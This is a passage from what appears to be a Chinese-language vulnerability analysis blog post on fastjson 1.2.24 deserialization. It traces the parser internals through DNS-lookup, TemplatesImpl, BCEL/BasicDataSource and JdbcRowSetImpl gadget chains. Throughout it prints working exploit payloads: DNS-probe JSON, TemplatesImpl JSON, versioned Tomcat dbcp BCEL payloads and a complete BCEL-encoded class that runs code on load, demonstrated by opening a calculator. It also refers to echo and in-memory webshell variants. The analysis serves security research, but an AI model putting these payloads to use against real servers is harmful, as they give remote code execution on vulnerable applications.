<p>如图，在解析过程中，判断了类的类型，进入<code>InetAddress.getName(strVal)</code>中</p>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/4.png" alt="4" style="zoom:50%;" /></div>

<h4 id="2-1-2-补充-Inet4Address解析域名"><a href="#2-1-2-补充-Inet4Address解析域名" class="headerlink" title="2.1.2 补充-Inet4Address解析域名"></a>2.1.2 补充-Inet4Address解析域名</h4><p>a. <code>InetAddress.getAllByName</code></p>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/a.png" alt="a" style="zoom:50%;" /></div>

<p>b. 判断是否为IP地址</p>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/b.png" alt="b" style="zoom:50%;" /></div>

<p>c. 判断cache中是否有缓存的域名解析地址，如果没有，则通过<code>getAddressesFromNameService</code>解析</p>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/c.png" alt="c" style="zoom:50%;" /></divc

<p>d. 接下来<code>lookupAllHostAddr</code>中就是一些解析域名的操作，先不跟入了</p>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/d.png" alt="d" style="zoom:50%;" /></div>

<h4 id="2-1-4-java-net-URL"><a href="#2-1-4-java-net-URL" class="headerlink" title="2.1.4 java.net.URL"></a>2.1.4 java.net.URL</h4><p>查看<code>MiscCodec</code>反序列化工具类，针对URL类的实例化处理只是<code>new URL</code>，那怎么触发DNS请求呢</p>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/5.png" alt="5" style="zoom:50%;" /></div>

<p><strong>没有思路的时候，可能是因为没有将反序列化流程完全分析到</strong></p>
<ul>
<li>首先在创建<code>DefaultJSONParser</code>时，将Set取出，并指定对应的token值</li>
<li>然后在paser方法时，进入指定的<code>SET</code>分支，进入<code>parseArray</code>方法</li>
<li>其中<code>[]</code>中<code>@type</code>对应的解析方法和之前一样是<code>parseObject(object, i);</code></li>
</ul>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/6.png" alt="6" style="zoom:50%;" /></div>
完成`@type`的反序列化操作后，进行`HashSet.add`操作
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/7.png" alt="7" style="zoom:50%;" /></div>
`HashSet.add`
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/8.png" alt="8" style="zoom:50%;" /></div>
`HashMap.put`
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/9.png" alt="9" style="zoom:50%;" /></div>
`key(java.net.URL对象).hashCode()`
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/10.png" alt="10" style="zoom:50%;" /></div>
这里就执行到`java.net.URL.hashCode`方法，这样就触发了域名解析；记得不太清楚了，似乎和`readObject`反序列化中的`URLDNS`利用链相似
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/11.png" alt="11" style="zoom:50%;" /></div>
由于整个解析流程，类似于流式结构，因此没有最后一个`]`闭合`Set`也是可以的

<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>同理，还有两个使用<code>parseArray</code>的解析流程，参照<code> com.alibaba.fastjson.parser.JSONLexerBase#nextToken</code>及<code>scanIdent</code>方法，对应<code>TreeSet</code> 和 []，但是他们对应的是<code>TreeSet</code>和<code>JSONArray</code>；如TreeSet的add方法，会执行<code>Compara</code>方法，需要实现<code>Comparable</code>类，并运行<code>Comparable.compareTo</code>方法，这里想到了<code>readObject CB</code>利用链，暂时放着。</p>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/12.png" alt="12" style="zoom:50%;" /></div>

<h4 id="2-1-5-poc构造"><a href="#2-1-5-poc构造" class="headerlink" title="2.1.5 poc构造"></a>2.1.5 poc构造</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetAddress&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet6Address&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="attr">&quot;address&quot;</span>:,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;]</span><br></pre></td></tr></table></figure>

<h3 id="2-2-TemplatesImpl利用链"><a href="#2-2-TemplatesImpl利用链" class="headerlink" title="2.2 TemplatesImpl利用链"></a>2.2 TemplatesImpl利用链</h3><h4 id="2-2-1-注意私有字段的赋值"><a href="#2-2-1-注意私有字段的赋值" class="headerlink" title="2.2.1 注意私有字段的赋值"></a>2.2.1 注意私有字段的赋值</h4><p>默认通过反射进行复制是不能使用私有字段的，此时需要在反序列化时加上<code>Feature.SupportNonPublicField</code>，因此这种利用链不一定在所有的场景都可以用</p>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/13.png" alt="13" style="zoom:50%;" /></div>

<h4 id="2-2-2-数组类型的变量"><a href="#2-2-2-数组类型的变量" class="headerlink" title="2.2.2 数组类型的变量"></a>2.2.2 数组类型的变量</h4><p>当字段值为数组类型时，使用的是<code>ObjectArrayCodec</code>这个类作为反序列化工具类</p>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/14.png" alt="14" style="zoom:50%;" /></div>

<div align=center><img src="/img/fastjson 1.2.24漏洞分析/15.png" alt="15" style="zoom:50%;" /></div>

<p><em>base64解码</em></p>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/16.png" alt="16" style="zoom:50%;" /></div>
通过序列化去写入一个`byte[]`字段值也可以看到
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/17.png" alt="17" style="zoom:50%;" /></div>
因此这个poc最大的限制在于目标在反序列化时，是否配置允许私有字段的属性，即指定`Feature.SupportNonPublicField` ,如果这项没有指定，那么也就不能使用了；

<h4 id="2-2-3-getOutputProperties"><a href="#2-2-3-getOutputProperties" class="headerlink" title="2.2.3 getOutputProperties"></a>2.2.3 getOutputProperties</h4><p>这里再提一下，这个poc的触发点，是这个方法；在之前分析fastjson反序列化流程时，对于getXXX方法也是会提取的，前提是getXXX的方法是没有传参的；</p>
<h4 id="2-2-4-结合CB利用链的新思路"><a href="#2-2-4-结合CB利用链的新思路" class="headerlink" title="2.2.4 结合CB利用链的新思路"></a>2.2.4 结合CB利用链的新思路</h4><p>记录一个思路： {“@type”:”org.apache.commons.beanutils.BeanComparator”,”comparator”:{“@type”:”org.apache.commons.collections.comparators.ComparableComparator”},”property”:”outputProperties”}<br>通过<code>TreeSet</code>触发反序列化，这个看看后续能不能用</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="attr">&quot;_bytecodes&quot;</span>:[<span class="string">&quot;xxxxxxx&quot;</span>],<span class="attr">&quot;_name&quot;</span>:<span class="string">&quot;a.b&quot;</span>,<span class="attr">&quot;_tfactory&quot;</span>:&#123;&#125;,<span class="attr">&quot;_outputProperties&quot;</span>:&#123; &#125;,<span class="attr">&quot;_version&quot;</span>:<span class="string">&quot;1.0&quot;</span>,<span class="attr">&quot;allowedProtocols&quot;</span>:<span class="string">&quot;all&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="attr">&quot;_bytecodes&quot;</span>: <span class="string">&quot;xxxxxxx&quot;</span>,<span class="attr">&quot;_name&quot;</span>:<span class="string">&quot;p&quot;</span>,<span class="attr">&quot;_tfactory&quot;</span>:&#123;&#125;,<span class="attr">&quot;_outputProperties&quot;</span>:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>这里类加载的部分就不说了，参考之前反序列化中分析<code>TemplatesImpl</code>的步骤，这里触发类的实例化的地方在<code>getOutputProperties()</code></li>
</ul>
<h3 id="2-3-BCEL利用链"><a href="#2-3-BCEL利用链" class="headerlink" title="2.3 BCEL利用链"></a>2.3 BCEL利用链</h3><h4 id="2-3-1-BasicDataSource关键类"><a href="#2-3-1-BasicDataSource关键类" class="headerlink" title="2.3.1 BasicDataSource关键类"></a>2.3.1 BasicDataSource关键类</h4><p>关键类：<code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code><br>如图，在createConnectionFactory方法调用了<code>Class.forName</code>，其中<code>driverClassName</code>和<code>driverClassLoader</code>两个私有参数都有对应的Set方法，因此是可控的</p>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/18.png" alt="18" style="zoom:50%;" /></div>

<ul>
<li>追踪一下<code>createConnectionFactory</code> 的调用链   </li>
</ul>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/e.png" alt="e" style="zoom:50%;" /></div> 

<p><strong>此时出现一个问题</strong>：</p>
<p>反序列化类的<code>get</code>方法的调用问题，之前的分析流程中<code>getXXX</code>方法会被提取，其中<code>FieldInfo</code>中<code>propertyName</code>是分割<code>getXXX</code>而来，因此不需要必须有对应的字段；<br>但是直接使用<code>JSON.parse(String str)</code>反序列化中，会对getXXX的返回值进行判断，返回类型只能为<code>Collection</code>、<code>Map</code>、<code>AtomicBoolean</code>、<code>AtomicInteger</code>、<code>AtomicLong</code>这几个类型；而<code>BasicDataSource#getConnection</code>的返回类型是<code>Connction</code>，因此不满足使用条件</p>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/19.png" alt="19" style="zoom:50%;" /></div>
#### 2.3.2 JSON.parseObject()
解决上面问题的办法，也有，网上公开的
即在示例代码中将`JSON.parse()`修改为`JSON.parseObject()`，此时触发了代码；但是并不能保证目标都是使用`parseObject`方法去解析
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String str = <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;       \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;       \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;             \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;       &#125;,\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;       \&quot;driverClassName\&quot;: \&quot;&quot;</span>+bcel+<span class="string">&quot;\&quot;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;      &#125;&quot;</span>;</span><br><span class="line">System.out.println(str);</span><br><span class="line">JSON.parseObject(str);</span><br></pre></td></tr></table></figure>
##### 2.3.2.1 JSON.toJSON(obj)

<ol>
<li>调试parseObject，如图，parse是一个正常的反序列化解析，后面返回一个<code>JSON.toJSON(obj);</code></li>
</ol>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/20.png" alt="20" style="zoom:50%;" /></div>
##### 2.3.2.2 createJavaBeanSerializer和createASMSerializer中创建sortedGetters

<ol start="2">
<li>进入toJSON方法，执行流程 <code>config.getObjectWriter(clazz)</code> -&gt; <code>createJavaBeanSerializer(clazz)</code></li>
</ol>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/21.png" alt="21" style="zoom:50%;" /></div>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/22.png" alt="22" style="zoom:50%;" /></div>

<ol start="3">
<li>在<code>createJavaBeanSerializer</code> 中关注一下<code>TypeUtils.buildBeanInfo(clazz, null, propertyNamingStrategy);</code>，这里分析这个位置的原因是，从后面的触发点来看，是取的<code>beanInfo</code>中的<code>sortedGetters</code>中的<code>FieldInfo</code>进行操作，因此先看看这些<code>get</code>方法什么时候被取到的</li>
</ol>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/23.png" alt="23" style="zoom:50%;" /></div>

<ol start="4">
<li>可以看到，这里的<code>computeGetters(beanType, jsonType, aliasMap, fieldCacheMap, false, propertyNamingStrategy);</code></li>
</ol>
<p> 不管从方法名上还是调试中，都是和获取<code>get</code>相关方法的<code>FieldInfo</code>相关</p>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/24.png" alt="24" style="zoom:50%;" /></div>

<ol start="5">
<li>如图获取了所有的方法，并对方法名进行判断，其中包括一个条件即<code>getXXX</code>的方法，最终构造一个<code>FieldInfo</code>，存入<code>fieldInfoMap</code>中并遍历到<code>fieldInfoList</code>中返回</li>
</ol>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/25.png" alt="25" style="zoom:50%;" /></div>

<ol start="6">
<li>最终<code>buildBeanInfo</code>返回一个<code>SerializeBeanInfo</code>的<code>BeanInfo</code>对象</li>
</ol>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/26.png" alt="26" style="zoom:50%;" /></div>

<ol start="7">
<li>接下来，在<code>createASMSerializer</code>时，判断接口字段信息是否有field为空、方法不为空，且方法不是实现的接口中的方法时，又进入了new JavaBeanSerializer(clazz)中；</li>
</ol>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/27.png" alt="27" style="zoom:50%;" /></div>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/28.png" alt="28" style="zoom:50%;" /></div>

<ol start="8">
<li>完成实例化<code>JavaBeanSerializer</code>后，返回<code>serializer</code></li>
</ol>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/29.png" alt="29" style="zoom:50%;" /></div>
##### 2.3.2.3 FieldInfo.get()方法触发invoke执行

<ol start="9">
<li>一路返回，到第二步，这里将sortedGetters中的FieldInfo，放到Map中，即图中的values</li>
</ol>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/30.png" alt="30" style="zoom:50%;" /></div>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title">getFieldValuesMap</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Map&lt;String, Object&gt; map = <span class="keyword">new</span> LinkedHashMap&lt;String, Object&gt;(sortedGetters.length);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (FieldSerializer getter : sortedGetters) &#123;</span><br><span class="line">        map.put(getter.fieldInfo.name, getter.getPropertyValue(object));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/31.png" alt="31" style="zoom:50%;" /></div>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/32.png" alt="32" style="zoom:50%;" /></div>
进入`FieldInfo.get`方法，这里执行了`invoke`，触发了`getConnection()`方法的调用；也就触发了`org.apache.tomcat.dbcp.dbcp.BasicDataSource#createConnectionFactory`，导致了恶意类加载
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/33.png" alt="33" style="zoom:50%;" /></div>

<h4 id="2-3-3-如何使用JSON-parse-触发"><a href="#2-3-3-如何使用JSON-parse-触发" class="headerlink" title="2.3.3 如何使用JSON.parse()触发"></a>2.3.3 如何使用JSON.parse()触发</h4><p><em>实际场景中，目标不一定使用</em><code>_JSON.parseObject(String str)_</code><em>进行解析</em></p>
<h5 id="2-3-3-1-Type为JSONObject类时"><a href="#2-3-3-1-Type为JSONObject类时" class="headerlink" title="2.3.3.1 @Type为JSONObject类时"></a>2.3.3.1 @Type为JSONObject类时</h5><p>如图的解析流程中，当<code>@type</code>类型是<code>JSONObject.class</code>时，会调用<code>key.toString()</code>方法</p>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/34.png" alt="34" style="zoom:50%;" /></div>

<h5 id="2-3-3-2-执行到key-toString-方法"><a href="#2-3-3-2-执行到key-toString-方法" class="headerlink" title="2.3.3.2 执行到key.toString()方法"></a>2.3.3.2 执行到key.toString()方法</h5><p>当<code>JSONObject</code>这个类标签解析完成后，执行到<code>key.toString()</code>方法</p>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/35.png" alt="35" style="zoom:50%;" /></div>
执行到`JSON#toJSONString()`方法；进入`new JSONSerializer(out).write(this)`方法
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/36.png" alt="36" style="zoom:50%;" /></div>

<h5 id="2-3-3-3-触发invoke"><a href="#2-3-3-3-触发invoke" class="headerlink" title="2.3.3.3 触发invoke"></a>2.3.3.3 触发invoke</h5><div align=center><img src="/img/fastjson 1.2.24漏洞分析/37.png" alt="37" style="zoom:50%;" /></div>
这里看到`getObjectWriter`，就和**2.3.2.2 **类似了；进入`preWriter.writer`方法，跟踪到`propertyValue = fieldSerializer.getPropertyValueDirect(object);`
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/38.png" alt="38" style="zoom:50%;" /></div>
和**2.3.2.3**一样的触发invoke执行代码
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/39.png" alt="39" style="zoom:50%;" /></div>

<h5 id="2-3-3-4-poc构造"><a href="#2-3-3-4-poc构造" class="headerlink" title="2.3.3.4 poc构造"></a>2.3.3.4 poc构造</h5><p>poc如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">  &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">  &quot;x&quot;:&#123;</span><br><span class="line">    &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">    &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">      &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;driverClassName&quot;: &quot;BCELPayload&quot;</span><br><span class="line">  &#125;: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而实际上在最开始的<code>parse()</code>方法中，进入parseObject之前，传入的object就是JSONObject类，因此不需要带上 <code>&quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;</code></p>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/40.png" alt="40" style="zoom:50%;" /></div>

<p>这样便带来一个疑问，<code>@type</code>字段的解析和不带<code>@type</code>的解析有什么区别<br>如图，传入的object类型是个Map类型，查看一下<code>JSONObject</code>类，确实implements <code>Map</code>接口</p>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/41.png" alt="41" style="zoom:50%;" /></div>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">## tomcat6、7</span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;x&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">      &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;driverClassName&quot;: &quot;BCELPayload&quot;</span><br><span class="line">    &#125;: &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">## &gt; tomcat8</span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;x&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br><span class="line">      &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;driverClassName&quot;: &quot;BCELPayload&quot;</span><br><span class="line">    &#125;: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--&lt;= tomcat7.x--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- tomcat6.x的依赖包路径：org.apache.tomcat dbcp 版本号--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.0.100<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&gt;= tomcat8.x--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
#### 2.3.4 回显和内存马EXP
首先可以确定的是，能用这个利用链肯定有tomcat的dbcp包，所以构造一下tomcat的回显和内存马即可

<h5 id="2-3-4-1-恶意代码块位置"><a href="#2-3-4-1-恶意代码块位置" class="headerlink" title="2.3.4.1 恶意代码块位置"></a>2.3.4.1 恶意代码块位置</h5><p>之前在构造shiro反序列化的时候，会将代码都放到默认构造方法中，因为最终会生成实例化对象，但是这里只是<code>Class.forName(String name)</code>，查看这个方法，实际上默认执行Class.forName(String name) 相当于</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(String name, <span class="keyword">true</span>, ClassLoader.getClassLoader(Reflection.getCallerClass()))</span><br></pre></td></tr></table></figure>
<p>因此会执行<code>static</code>中的代码块</p>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/42.png" alt="42" style="zoom:50%;" /></div>
使用案例测试一下
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/43.png" alt="43" style="zoom:50%;" /></div>

<h5 id="2-3-4-2-弹出计算器"><a href="#2-3-4-2-弹出计算器" class="headerlink" title="2.3.4.2 弹出计算器"></a>2.3.4.2 弹出计算器</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line">        <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,                </span><br><span class="line">            	<span class="string">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>               </span><br><span class="line">                        &#125;,</span><br><span class="line">                <span class="string">&quot;driverClassName&quot;</span>: <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$Ae$90$cdJ$c3$40$U$85$cfm$da$s$c6$d6$feh$fd$5b$v$I$a6$$$9a$85$cb$W$a1$U$5c$v$8a$R$5dO$c7$a1LM$93$90LE$9f$c8u7$w$$$7c$A$lJ$bc$J$F$L$O3s$b8$973$df$e1$ce$f7$cf$e7$X$80S$ec$Thh$83$I$cd$a9x$S$7e$u$a2$89$7f5$9e$wilX$E7$88$e7$a9T$e7$3aT$84$ea$b0$97$9b$I$ce$40$86$3a$d2$e6$8c$60y$dd$3bBy$U$3f$b0$a1$f5$c7$b8$99GF$cf$94$N$97$n$Te$965$a1$e3u$_$fe$d9$fa5$d4Pw$b1$8e$N$82$X$t$w$3a$f0$83$97$cc$a8$99$3fL$92PKat$ie$feH$84r$k$K$T$a7$3d$91$q$O$9a$i$ad$9e$95$q$i$7b$x$d4$c0$a4$3a$9a$f4W$83$ae$d3X$aa$y$e3$a066$f3$a0$zB$3d0B$3e$5e$8a$e4V$8c$8b$f9$G$c5P5$ec$c0qQ$c6$$$OQb$cdW$J$Ol$3e$845$ae$8e$60q$Hh$bc$f2$t$5d$7c$a0$d1n$bd$a1s$bf$e0$Wa$9bo$L$c4$3b$H$z_$b4X$89$b5r$f2$8e$bdE$81$qT$Kp$f5$X$Rg$_$92$8e$B$A$A&quot;</span>        &#125;</span><br><span class="line">    &#125;: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/44.png" alt="44" style="zoom:50%;" /></div>

<h5 id="2-3-4-3-回显"><a href="#2-3-4-3-回显" class="headerlink" title="2.3.4.3 回显"></a>2.3.4.3 回显</h5><div align=center><img src="/img/fastjson 1.2.24漏洞分析/45.png" alt="45" style="zoom:50%;" /></div>

<h5 id="2-3-4-4-内存马"><a href="#2-3-4-4-内存马" class="headerlink" title="2.3.4.4 内存马"></a>2.3.4.4 内存马</h5><p>还未构造，和<code>Tomcat</code>一样</p>
<h3 id="2-4-JdbcRowSetImpl利用链"><a href="#2-4-JdbcRowSetImpl利用链" class="headerlink" title="2.4 JdbcRowSetImpl利用链"></a>2.4 JdbcRowSetImpl利用链</h3><h4 id="2-4-1-JNDI调用"><a href="#2-4-1-JNDI调用" class="headerlink" title="2.4.1 JNDI调用"></a>2.4.1 JNDI调用</h4><p>如图<code>JdbcRowSetImpl#connect</code>中触发<code>JNDI</code>请求，<code>dataSourceName</code>是参数</p>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/46.png" alt="46" style="zoom:50%;" /></div>

<h4 id="2-4-2-触发链setAutoCommit"><a href="#2-4-2-触发链setAutoCommit" class="headerlink" title="2.4.2 触发链setAutoCommit"></a>2.4.2 触发链setAutoCommit</h4><div align=center><img src="/img/fastjson 1.2.24漏洞分析/47.png" alt="47" style="zoom:50%;" /></div>

